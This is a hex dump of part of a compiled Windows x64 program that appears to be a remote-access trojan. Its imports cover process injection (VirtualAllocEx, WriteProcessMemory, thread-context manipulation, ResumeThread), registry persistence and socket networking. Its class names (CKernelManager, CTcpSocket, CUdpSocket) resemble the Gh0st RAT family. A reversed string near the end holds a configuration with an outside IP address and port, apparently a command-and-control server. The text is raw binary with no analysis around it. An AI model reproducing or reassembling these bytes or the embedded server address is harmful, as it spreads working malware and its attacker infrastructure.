FFFFFFC5F0000010000002C6000000000000036600000FFFFFFFF4460000001000000586000000000000062600000FFFFFFFF7360000001000000EC6000000000000003610000FFFFFFFF010A04000A3407000A3206702100000060580000A158000028C901002105020005C4080060580000A158000028C901000112080012540A001234090012320ED00C700B6021000000B0550000B6550000B8C9010021000000B6550000BB550000A4C9010021000000BB5500003156000080C901002105020005D40800BB5500003156000080C9010021660A0066640E0061540D000FF406000AE4070005C40900B6550000BB550000A4C901002105020005340C00B0550000B6550000B8C901000106020006920270210000006054000078540000A8B40100210A04000A740800056407006054000078540000A8B401002100000050480000DD480000A8B40100210502000574060050480000DD480000A8B40100210002000034080040620000A562000044CA01002100000040620000A562000044CA0100210502000534080040620000A562000044CA01000115080015740B0015640A0015540900155211C0010F06000F5409000F3408000F520B7019230800146411001454100014340F0014B2107068DC000050000000192D0D351FC40F001B740E0017640D0013340C000F330A7206E004D00250000068DC00003000000001530800536409000F540B000F340A000F520B70010F06000F640A000F3409000F520B70191903250B2306520250000068DC0000200000000104010004A20000011C0C001C640D001C540C001C340B001C3218F016E014D012C01070010401000442000001180A0018640B001854090018340800183214D012C01070010F06000F640C000F340B000F720B700114080014640C0014540B0014340A001472107001060200067202500918020018B2143050BC000001000000DB1C0100FB1C01007C720100FB1C010001180A0018640A001854090018340800183214D012C01070192D0A001C01B7000DF00BE009D007C0057004600330025068DC0000A0050000011D0C001D7411001D6410001D540F001D340E001D9219F017D015C0191B06000C011100057004600350023068DC000070000000011A0A001A7412001A3411001A9213F011E00FD00DC00B5001190A0019740D0019640C0019540B0019340A00197215C01918050009E20570046003500230000068DC000060000000191D06000EF207C0057004600350023068DC00007000000019280A001A680F00160121000BD009C0077006600530045068DC0000E00000001922080022521EF01CE01AD018C016701560143050BC0000020000007E32010015330100C272010015330100463201003C330100E272010000000000090D01000D42000050BC000001000000AC330100BF3301000B730100BF330100011C0C001C640C001C540B001C340A001C3218F016E014D012C010700107030007420350023000001913080013F20CF00AE008D006C004700360023050BC0000020000009E350100C935010023730100C93501009E35010046360100237401000000000009190A0019740C0019640B0019340A00195215E013D011C050BC00000100000068370100B438010001000000B8380100090F06000F6407000F3406000F320B7050BC0000010000000639010076390100010000007639010001170A001754120017341000179213E011D00FC00D700C6001190A001934150019B215F013E011D00FC00D700C600B5001250B0025341D00250112001AF018E016D014C0127011601050000001180A0018640E0018540D0018340C00187214E012C0107019230600157415001534140015F20B5068DC0000780000000105020005340100191F060011011100057004600330025068DC000070000000011B08001B7409001B6408001B3407001B3214500104010004820000090F06000F6409000F3408000F320B7050BC000001000000764C01007D4C0100B27401007D4C0100010401000442000019250A001734160017B210F00EE00CD00AC008700760065068DC000050000000192A0B001C341E001C01140010F00EE00CD00AC0087007600650000068DC000098000000192A0B001C3421001C01180010F00EE00CD00AC0087007600650000068DC0000B0000000010401000402000001180A00186408001854070018340600181214E012C010700000000028F3010000000000FFFFFFFF00000000040000000000000000000000000000000000000001000000E8CE0100000000000000000000000000000000000000000010CF0100000000000000000000000000000000000000000050F3010000000000FFFFFFFF0000000018000000049000000000000000000000000000000000000078F3010000000000FFFFFFFF0000000018000000701600000000000000000000000000000200000068CF010040CF010000000000000000000000000000000000001300000000000090CF010000000000000000000000000000000000000000003830010000000000E8CF0100000000000000000000000000000000000200000000D0010040CF01000000000000000000000000000000000088FC010000000000FFFFFFFF000000001800000058410100000000000000000000000000D8D00100000000000000000036D8010038800100D0D301000000000000000000D8D8010030830100A0D0010000000000000000004AD901000080010028D401000000000000000000DCD901008883010018D401000000000000000000F6D901007883010000000000000000000000000000000000000000002AD90100000000001AD901000000000008D9010000000000F4D8010000000000E4D801000000000038D901000000000000000000000000005CD50100000000006AD501000000000082D50100000000009AD5010000000000B0D5010000000000BCD5010000000000C4D5010000000000D4D5010000000000E4D5010000000000F2D501000000000008D60100000000001AD60100000000002AD601000000000040D60100000000004CD60100000000005AD60100000000006AD601000000000076D601000000000090D6010000000000A4D6010000000000BCD6010000000000D0D601000000000044D5010000000000F2D601000000000008D70100000000001AD701000000000030D701000000000042D701000000000058D701000000000068D701000000000076D701000000000094D7010000000000A8D7010000000000B8D7010000000000CCD7010000000000DAD7010000000000ECD7010000000000FCD701000000000010D801000000000026D801000000000016DD01000000000006DD010000000000F6DC010000000000E4DC010000000000CEDC01000000000036D50100000000000ED501000000000002D5010000000000F6D4010000000000E6D4010000000000E4D6010000000000D8D4010000000000BCDC010000000000B0DC010000000000A6DC0100000000009ADC01000000000088DC01000000000026DD01000000000078DC01000000000066DC0100000000004CDC0100000000003CDC01000000000022DC01000000000010DC01000000000002DC010000000000F0DB010000000000D6DB010000000000BCDB010000000000AEDB010000000000A2DB01000000000098DB0100000000008ADB0100000000007CDB01000000000000DA0100000000000EDA0100000000001ADA0100000000002CDA0100000000003ADA0100000000004ADA0100000000005ADA0100000000006CDA0100000000007EDA01000000000092DA010000000000A6DA010000000000C2DA010000000000D6DA010000000000F0DA01000000000004DB0100000000001ADB01000000000028DB0100000000003CDB0100000000004ADB01000000000056DB01000000000066DB010000000000000000000000000044D8010000000000C2D801000000000058D801000000000068D80100000000007CD801000000000098D8010000000000A6D8010000000000B6D80100000000000000000000000000E8D9010000000000000000000000000064D901000000000058D901000000000004000000000000807300000000000080120000000000008080D9010000000000150000000000008010000000000000801700000000000080030000000000008034000000000000801300000000000080700000000000008090D90100000000001600000000000080A2D9010000000000B4D90100000000006F00000000000080CCD9010000000000090000000000008074000000000000800000000000000000FB045669727475616C4672656500F8045669727475616C416C6C6F630000D30248656170416C6C6F6300D70248656170467265650000EB02496E697469616C697A65437269746963616C53656374696F6E416E645370696E436F756E7400D6024865617044657374726F79003B034C65617665437269746963616C53656374696F6E0000D502486561704372656174650000F200456E746572437269746963616C53656374696F6E0000D20044656C657465437269746963616C53656374696F6E00080557616974466F7253696E676C654F626A6563740067045365744576656E740000C004536C6565700082004372656174654576656E7441000008024765744C6173744572726F7200005200436C6F736548616E646C6500CB0147657443757272656E7454687265616449640000CA04537769746368546F546872656164000080045365744C6173744572726F72000020055769646543686172546F4D756C7469427974650061056C7374726C656E570000120452657365744576656E74000085004372656174654576656E74570000420043616E63656C496F0000DC04547279456E746572437269746963616C53656374696F6E00BA045365745761697461626C6554696D65720000C3004372656174655761697461626C6554696D65725700008D02476574546872656164436F6E7465787400009E04536574546872656164436F6E74657874000082034F70656E50726F6365737300E60147657445786974436F646550726F636573730000A40043726561746550726F63657373410000760247657453797374656D4469726563746F72794100F9045669727475616C416C6C6F63457800003D05577269746550726F636573734D656D6F727900001604526573756D6554687265616400006801467265654C69627261727900B304536574556E68616E646C6564457863657074696F6E46696C74657200C60147657443757272656E7450726F636573730041034C6F61644C696272617279570000BD01476574436F6E736F6C6557696E646F7700008F0043726561746546696C6557004C0247657450726F6341646472657373000009024765744C6F63616C54696D65000002034973446562756767657250726573656E7400C70147657443757272656E7450726F63657373496400B40043726561746554687265616400004B45524E454C33322E646C6C0000AF0044697370617463684D65737361676557000037025065656B4D65737361676557000004035472616E736C6174654D657373616765000020024D736757616974466F724D756C7469706C654F626A6563747300E70253686F7757696E646F7700003A01476574496E7075745374617465003B0377737072696E746657003C02506F73745468726561644D6573736167654100005553455233322E646C6C00003C025265674372656174654B657957006E02526567517565727956616C75654578570000480252656744656C65746556616C7565570061025265674F70656E4B6579457857003002526567436C6F73654B6579007E0252656753657456616C7565457857000041445641504933322E646C6C00003600575341496F63746C0000590057534157616974466F724D756C7469706C654576656E74730000480057534152657365744576656E740020005753414372656174654576656E7400002A005753414576656E7453656C65637400002700575341456E756D4E6574776F726B4576656E747300001B00575341436C6F73654576656E74005753325F33322E646C6C00008A0074696D6547657454696D650057494E4D4D2E646C6C00DA02486561705265416C6C6F6300DC024865617053697A650000510247657450726F636573734865617000002001457869745468726561640000CB004465636F6465506F696E74657200EE00456E636F6465506F696E746572008D01476574436F6D6D616E644C696E655700B4035261697365457863657074696F6E0000210452746C5063546F46696C6548656164657200CE045465726D696E61746550726F636573730000E204556E68616E646C6564457863657074696F6E46696C7465720000260452746C5669727475616C556E77696E6400001F0452746C4C6F6F6B757046756E6374696F6E456E7472790000180452746C43617074757265436F6E7465787400DB0248656170536574496E666F726D6174696F6E0000AA0247657456657273696F6E00001E024765744D6F64756C6548616E646C655700001F014578697450726F63657373003405577269746546696C65006B0247657453746448616E646C6500001A024765744D6F64756C6546696C654E616D655700005A01466C7347657456616C7565005B01466C7353657456616C7565005901466C7346726565005801466C73416C6C6F630000250452746C556E77696E64457800670146726565456E7669726F6E6D656E74537472696E67735700E101476574456E7669726F6E6D656E74537472696E67735700007C0453657448616E646C65436F756E740000FA0147657446696C6554797065006A0247657453746172747570496E666F5700A9035175657279506572666F726D616E6365436F756E746572009A024765745469636B436F756E740000800247657453797374656D54696D65417346696C6554696D6500740453657446696C65506F696E7465720000A001476574436F6E736F6C6543500000B201476574436F6E736F6C654D6F6465000078014765744350496E666F006E0147657441435000003E024765744F454D435000000C03497356616C6964436F6465506167650069034D756C746942797465546F5769646543686172007002476574537472696E6754797065570000940453657453746448616E646C65000033055772697465436F6E736F6C6557002F034C434D6170537472696E675700005D01466C75736846696C65427566666572730000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F884014001000000C00102400100000000E0014001000000000000000000000002000000000000000000000000000000308501400100000000000000000000002E3F4156747970655F696E666F404000020000000000000000000000000000000100000016000000020000000200000003000000020000000400000018000000050000000D0000000600000009000000070000000C000000080000000C000000090000000C0000000A000000070000000B000000080000000C000000160000000D000000160000000F00000002000000100000000D00000011000000120000001200000002000000210000000D0000003500000002000000410000000D00000043000000020000005000000011000000520000000D000000530000000D0000005700000016000000590000000B0000006C0000000D0000006D00000020000000700000001C00000072000000090000000600000016000000800000000A000000810000000A00000082000000090000008300000016000000840000000D00000091000000290000009E0000000D000000A100000002000000A40000000B000000A70000000D000000B700000011000000CE00000002000000D70000000B000000180700000C0000000C00000008000000010000000000000032A2DF2D992B0000CD5D20D266D4FFFF00000000000000000891014001000000F890014001000000FFFFFFFF000000000000000000000000FFFFFFFFFFFFFFFF800A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000010000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000010000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000100000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000240001400100000024000140010000002400014001000000240001400100000024000140010000002400014001000000240001400100000024000140010000002400014001000000240001400100000020350240010000000000000000000000203502400100000001010000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000002000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000101010101010101010101010101010101010101010101010101000000000000020202020202020202020202020202020202020202020202020200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006162636465666768696A6B6C6D6E6F707172737475767778797A0000000000004142434445464748494A4B4C4D4E4F505152535455565758595A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000101010101010101010101010101010101010101010101010101000000000000020202020202020202020202020202020202020202020202020200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006162636465666768696A6B6C6D6E6F707172737475767778797A0000000000004142434445464748494A4B4C4D4E4F505152535455565758595A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C0E80140010000000102040800000000A4030000608279822100000000000000A6DF000000000000A1A5000000000000819FE0FC00000000407E80FC00000000A8030000C1A3DAA320000000000000000000000000000000000000000000000081FE00000000000040FE000000000000B5030000C1A3DAA320000000000000000000000000000000000000000000000081FE00000000000041FE000000000000B6030000CFA2E4A21A00E5A2E8A25B000000000000000000000000000000000081FE000000000000407EA1FE000000005105000051DA5EDA20005FDA6ADA32000000000000000000000000000000000081D3D8DEE0F90000317E81FE00000000FEFFFFFF430000000000000000000000F89F014001000000F49F014001000000F09F014001000000EC9F014001000000E89F014001000000E49F014001000000E09F014001000000D89F014001000000D09F014001000000C89F014001000000B89F014001000000A89F0140010000009C9F014001000000909F0140010000008C9F014001000000889F014001000000849F014001000000809F0140010000007C9F014001000000789F014001000000749F014001000000709F0140010000006C9F014001000000689F014001000000649F014001000000609F014001000000589F014001000000489F0140010000003C9F014001000000349F0140010000007C9F0140010000002C9F014001000000249F0140010000001C9F014001000000109F014001000000089F014001000000F89E014001000000E89E014001000000E09E014001000000DC9E014001000000D09E014001000000B89E014001000000A89E01400100000009040000010000000000000000000000A09E014001000000989E014001000000909E014001000000889E014001000000809E014001000000789E014001000000709E014001000000609E014001000000509E014001000000409E014001000000289E014001000000109E014001000000009E014001000000E89D014001000000E09D014001000000D89D014001000000D09D014001000000C89D014001000000C09D014001000000B89D014001000000B09D014001000000A89D014001000000A09D014001000000989D014001000000909D014001000000889D014001000000789D014001000000609D014001000000509D014001000000409D014001000000C09D014001000000309D014001000000209D014001000000109D014001000000F89C014001000000E89C014001000000D09C014001000000B89C014001000000AC9C014001000000A49C014001000000909C014001000000689C014001000000509C0140010000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F4ED014001000000000000000000000000000000000000000000000000000000F4ED014001000000000000000000000000000000000000000000000000000000F4ED014001000000000000000000000000000000000000000000000000000000F4ED014001000000000000000000000000000000000000000000000000000000F4ED014001000000000000000000000000000000000000000000000000000000010000000100000000000000000000000000000000000000000000000000000040F20140010000000000000000000000000000000000000080A101400100000010A601400100000090A701400100000000EE014001000000C0F001400100000084A30140010000002E0000002E00000040F201400100000030F20140010000007C130240010000007C130240010000007C130240010000007C130240010000007C130240010000007C130240010000007C130240010000007C130240010000007C130240010000007F7F7F7F7F7F7F7F34F2014001000000801302400100000080130240010000008013024001000000801302400100000080130240010000008013024001000000801302400100000080A101400100000082A3014001000000010000002E00000001000000000000000000000000000000FEFFFFFFFFFFFFFF308501400100000000000000000000002E3F4156434275666665724040000000308501400100000000000000000000002E3F41564341746C457863657074696F6E4041544C404000308501400100000000000000000000002E3F4156657863657074696F6E4073746440400000000000308501400100000000000000000000002E3F41566261645F616C6C6F634073746440400000000000308501400100000000000000000000002E3F4156434D616E6167657240400000308501400100000000000000000000002E3F415643546370536F636B657440400000000000000000308501400100000000000000000000002E3F415649536F636B657442617365404000000000000000308501400100000000000000000000002E3F4156434B65726E656C4D616E6167657240400000000000000000000000007C0030003A00640062007C0030003A006C006B007C0030003A00680073007C0030003A006C0064007C0030003A006C006C007C0030003A00680062007C0030003A0070006A007C00360032002E00380020002E0035003200300032003A007A0062007C0030002E0031003A00620062007C00A48BD89E3A007A0066007C0031003A006C0063007C0031003A00640064007C0031003A00330074007C003A0033006F007C003A00330070007C0031003A00320074007C003A0032006F007C003A00320070007C0031003A00310074007C003500350035003A0031006F007C00370034002E00360038002E00380038002E003900340031003A00310070007C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B0A90140010000000004000000040000308501400100000000000000000000002E3F41563F244341727153657373696F6E54405643556470536F636B657440405631404040000000308501400100000000000000000000002E3F415643556470536F636B6574404000000000001000007598000073980000308501400100000000000000000000002E3F41566261645F657863657074696F6E40737464404000140000000000000024AF0140010000001D0000000000000020AF0140010000001A000000000000001CAF0140010000001B0000000000000014AF0140010000001F000000000000000CAF014001000000130000000000000004AF0140010000002100000000000000FCAE0140010000000E00000000000000F4AE0140010000000D00000000000000ECAE0140010000000F00000000000000E4AE0140010000001000000000000000DCAE0140010000000500000000000000D4AE0140010000001E00000000000000D0AE0140010000001200000000000000CCAE0140010000002000000000000000C8AE0140010000000C0000000000000080AD0140010000000B00000000000000C0AE0140010000001500000000000000B8AE0140010000001C00000000000000B0AE0140010000001900000000000000A8AE0140010000001100000000000000A0AE014001000000180000000000000098AE014001000000160000000000000090AE014001000000170000000000000088AE014001000000220000000000000084AE014001000000230000000000000080AE01400100000024000000000000007CAE014001000000250000000000000074AE014001000000260000000000000068AE014001000000942600000100000000000000000000000004000001FCFFFF350000000B00000040000000FF0300008000000081FFFFFF1800000008000000200000007F000000000000000000F07F000000000000F8FFFFFFFFFFFFFFEF7F000000000000100000000000000000800000000000000000000000000000000000A00240000000000000000000C80540000000000000000000FA08400000000000000000409C0C40000000000000000050C30F40000000000000000024F412400000000000000080969816400000000000000020BCBE1940000000000004BFC91B8E3440000000A1EDCCCE1BC2D34E4020F09EB5702BA8ADC59D6940D05DFD25E51A8E4F19EB83407196D795430E058D29AF9E40F9BFA044ED81128F8182B940BF3CD5A6CFFF491F78C2D3406FC6E08CE980C947BA93A841BC856B5527398DF770E07C42BCDD8EDEF99DFBEB7EAA5143A1E676E3CCF2292F84812644281017AAF8AE10E3C5C4FA44EBA7D4F3F7EBE14A7A95CF4565CCC7910EA6AEA019E3A3460D65170C7581867576C9484D5842E4A793393B35B8B2ED534DA7E55D3DC55D3B8B9E925AFF5DA6F0A120C054A58C3761D1FD8B5A8BD8255D89F9DB67AA95F8F327BFA2C85DDD806E4CC99B97208A025260C4257500000000CDCCCDCCCCCCCCCCCCCCFB3F713D0AD7A3703D0AD7A3F83F5A643BDF4F8D976E1283F53FC3D32C6519E25817B7D1F13FD00F2384471B47ACC5A7EE3F40A6B6696CAF05BD3786EB3F333DBC427AE5D594BFD6E73FC2FDFDCE61841177CCABE43F2F4C5BE14DC4BE9495E6C93F92C4533B7544CD14BE9AAF3FDE67BA943945AD1EB1CF943F2423C6E2BCBA3B31618B7A3F615559C17EB1537C12BB5F3FD7EE2F8D06BE928515FB443F243FA5E939A527EA7FA82A3F7DACA1E4BC647C46D0DD553E637B06CC23547783FF91813D91FA3A197A63254331C0AC3C2189D138824797B800FDD73BDC8858081BB1E8E386A6033BC684454207B6997537DB2E3A33711CD223DB32EE49905A39A687BEC057DAA582A6A2B532E268B211A7529F4459B7102C2549E42D36344F53AECE6B258F5904A4C0DEC27DFBE8C61E9EE7885A57913CBF508322184E4B6562FD838FAF06947D11E42DDE9FCED2C804DDA6D80A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000004C10000098BD0100501000007A10000008CB0100801000008A10000084BF01008A100000CB10000068BF0100CB1000004D11000054BF01004D1100006B11000044BF01006B110000E511000030BF0100F01100001812000028BF0100181200004912000014BF010049120000C1120000F8BE0100D0120000EA12000008CB0100101300004913000098BD0100501300005E130000A8B401005E130000AE1300000CC30100AE130000B4130000FCC20100C0130000EB130000DCC50100EB13000004140000E4BE01000414000011140000D4BE010030140000AA140000DCC50100AA140000E7140000C8C50100E714000032150000B8C50100401500004E150000F0C201004E1500005E150000DCC201005E150000A4150000C4C20100A4150000B2150000B4C20100B2150000D5150000A4C20100E0150000F3150000CCBE0100F315000055160000B8BE01005516000070160000A4BE01007016000091160000A8B40100A01600001F17000084BD010040170000BD17000054C30100C01700006619000090BE0100701900007E1900009CC201007E1900008A19000088C201008A1900008F19000074C201008F190000EA1A000060C20100EA1A0000491B000050C20100491B0000591B000040C20100591B0000681B00002CC20100681B00006A1B00001CC20100701B0000021C00000CC20100021C0000E21C0000ECC10100E21C0000651D0000D8C10100651D0000741D0000C8C10100801D0000AA1D0000BCC10100AA1D0000061F00009CC10100061F0000D11F000088C10100D11F0000EE1F000078C10100EE1F0000F51F000054C1010090200000AF20000048C10100AF200000252100002CC10100252100002E2100001CC10100302100005D21000080BE01005D2100002122000068BE0100212200005022000058BE01005022000081220000A8B40100812200004023000008C101004023000060230000F4C001006023000081230000E4C0010090230000F6230000ACC50100F62300005E28000088C501005E2800006C28000064C501006C2800007828000054C5010080280000C0280000D4C00100C0280000C4280000C0C00100C42800007C300000A4C001007C300000F930000090C00100F9300000253100007CC0010025310000433100006CC0010050310000783100004CBE010078310000AA31000038BE0100AA310000E131000024BE0100E1310000FF31000024BE0100FF3100000D32000014BE0100303200000F33000054C0010010330000363300000CBE0100363300008A330000F8BD01008A33000090330000E8BD0100903300002234000038C50100223400002A34000024C501002A340000BE34000010C50100BE3400006B36000000C501006B3600008D360000F0C4010090360000AB360000DCC40100AB360000FE360000C8C40100FE36000088370000B4C401008837000095370000A4C4010095370000B937000094C40100B9370000D23700007CC40100E037000060380000F8C801006038000066380000B8C90100663800006B38000068C401006B380000E138000044C40100E13800007639000030C4010076390000A23A000020C40100A23A0000F83A000010C40100F83A00000B3B000000C40100103B0000073C000068BD0100103C0000733C0000A8B40100803C0000D43E0000E4C30100F03E0000A0400000ACCA0100A04000005A41000054C30100604100007D410000DCC501007D410000C6410000D0C30100C641000019420000C0C30100204200009942000050BD010099420000A64200003CBD0100A64200008F43000028BD01008F4300000544000018BD0100054400002244000008BD0100304400009446000084CA0100A04600004448000068CA010050480000DD480000A8B40100DD4800002C490000F8C901002C49000042490000E8C9010050490000C64A000058CA0100D04A0000C14C000074CB0100D04C0000F44C000048C00100F44C0000704D000030C00100704D00007E4D000020C00100804D0000544E000098BD0100604E0000A04F000054C30100A04F0000A6500000B8C30100B05000000251000010C001000251000074510000FCBF0100745100009D510000ECBF0100A05100005152000038C70100605200003C53000028C70100505300005B540000C0CA01006054000078540000A8B40100785400009C550000D0C901009C550000A4550000C0C90100B0550000B6550000B8C90100B6550000BB550000A4C90100BB5500003156000080C9010031560000C65600006CC90100C6560000F25700005CC90100F2570000485800004CC90100485800005B5800003CC9010060580000A158000028C90100A15800000859000014C9010008590000AD59000004C90100B05900002A5A0000A8B40100405A0000005D00009CC30100005D00007F5D000098BD0100805D00000C5E0000F8C80100105E00002B5E000094C301002B5E0000715E00007CC30100715E0000C75E000064C30100D05E0000775F000014C70100805F00001E6100005CC80100206100003562000000C7010040620000A562000044CA0100A56200007363000030CA0100736300008963000020CA010089630000B96300000CCA0100B9630000CB63000020CA0100D063000048650000E0C70100506500007A66000054C3010090660000B7670000FCBC0100C06700001268000098BD01002068000057680000A8B401006068000082680000DCBF01008268000019690000C8BF010019690000BF690000B4BF0100BF6900006C6C0000A4BF01006C6C0000776C000094BF0100806C0000AE6D0000E0BC0100AE6D0000446E0000CCBC0100446E0000686E0000BCBC0100706E0000016F0000ACBC0100106F00003A6F0000A4BC0100406F0000666F000008CB0100706F00009972000018C60100A0720000CB73000068BD0100D0730000E4730000E0BD0100E4730000CC800000B4BD0100CC800000D1800000A4BD0100E08000006B83000088C7010070830000B683000090BC0100B6830000DD8300007CBC0100DD830000A384000064BC0100A38400001785000050BC0100178500002785000040BC0100278500002F85000030BC01002F8500004985000020BC01005085000078850000A8B40100808500001686000068B60100208600004786000008CB010050860000EC86000054C30100F08600006587000098BD0100808700001788000020C301002088000061880000E8C5010070880000CD88000044C70100E0880000FD88000008CB0100008900003F89000008CB0100508900009A89000098BD0100B8890000DE890000A8B40100E0890000558A000098BD0100588A0000AA8A0000A8B40100D08A0000EF8A0000B0B40100008B0000348E0000B8B40100348E00006D8E000098BD0100708E00008E8E000008CB0100C08E00001A8F0000BCB401001C8F0000438F0000A8B40100448F0000718F0000A8B40100748F0000B88F000098BD0100C88F00000190000098BD0100049000002E900000A8B40100309000006D90000078BB0100709000002691000054C3010028910000CB910000A8B90100CC9100000C92000008CB01000C920000C1920000CCB40100D09200003B930000A8B4010084930000A493000008CB0100A4930000C493000008CB0100C49300000A940000A8B401000C9400002F940000A8B40100309400005C940000E0B401005C940000DC940000A8B40100DC940000CE95000000B50100D89500001B960000A8B401001C9600002697000018B50100289700003F97000008CB0100409700002698000048B50100289800009698000060B5010098980000AE98000068B60100FC980000739A000068B50100749A0000869A000008CB0100889A00001B9B00008CB501001C9B0000669C00009CB50100689C0000D49C0000A4B50100F09C0000A09D0000C8B50100A09D0000019E0000A8B40100209E0000C89E0000D0B50100C89E00001E9F000008CB0100209F0000599F0000A8B401005C9F0000729F0000A8B401008C9F0000CF9F0000A8B40100D09F000003A00000D4B5010004A000003DA0000098BD010040A00000EFA0000098BD0100F0A000007FA20000E0B50100B8A20000DEA20000A8B401000CA3000069A5000010B601006CA50000AFA5000008CB0100B8A50000EBA50000A8B40100F4A500003FA7000034B6010040A7000071A7000008CB010074A70000E3A7000054B60100E4A7000002A8000068B6010034A8000066AA000070B6010068AA0000F5AB0000A0B60100F8AB000099AC0000A8B401009CAC000043AD000068B7010044AD0000A6B70000B4B60100C0B70000AAB80000D8B60100D0B80000F5B8000008CB0100F8B80000ADB90000DCB60100B0B9000034BA000098BD010034BA000058BA0000A8B4010058BA00008BBB000018B701008CBB0000CABB0000A8B40100CCBB00004DBC0000A8B4010050BC00004DBE00004CB7010050BE000020C0000090BE010020C000009EC0000068B70100A0C0000023C1000068B7010024C10000A9C1000068B70100B4C10000EDC1000008CB0100F0C1000036C20000A8B4010038C2000089C2000080B701008CC2000037CD0000B4B6010038CD000020CF000094B7010028CF000069CF000008CB01006CCF000084CF000008CB010084CF0000B9D00000ACB70100BCD0000054D20000C4B7010054D2000044D30000DCB7010044D30000C9D30000